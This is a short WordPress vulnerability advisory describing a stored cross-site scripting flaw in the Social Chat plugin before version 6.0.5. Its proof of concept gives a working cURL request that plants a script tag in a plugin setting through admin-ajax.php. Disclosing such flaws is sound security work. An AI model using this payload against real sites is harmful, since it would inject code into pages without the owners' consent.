## WordPress Plugin Vulnerabilities

# Social Chat < 6.0.5 - Admin+ Stored Cross-Site Scripting

### Description

The plugin does not sanitise and escape some of its settings, which could allow high privilege users such as admin to perform Stored Cross-Site Scripting attacks.

### Proof of Concept

- As a logged-in administrator, visit http://vulnerable-site.tld/wp-admin/admin.php?page=qlwapp\_scheme
- Grab the "qlwapp\_scheme\_form\_nonce" nonce (search for it in the page's source).
- Run the following cURL request:
curl --url 'http://vulnerable-site.tld/wp-admin/admin-ajax.php' --data 'action=qlwapp\_save\_scheme&nonce=THE\_NONCE&form\_data=font-family%3Dinherit%26font-size%3D18%26brand%3D%2523666666</style><script>alert(1)</script>%26text%3D%26link%3D%26message%3D%26label%3D%26name%3D%26qlwapp\_scheme\_form\_nonce%3D1537a512c1%26\_wp\_http\_referer%3D%252Fblog%252Fwp-admin%252Fadmin.php%253Fpage%253Dqlwapp\_scheme' -b 'YOUR COOKIES'
- After that, visit the WordPress site and the javascript code will get executed
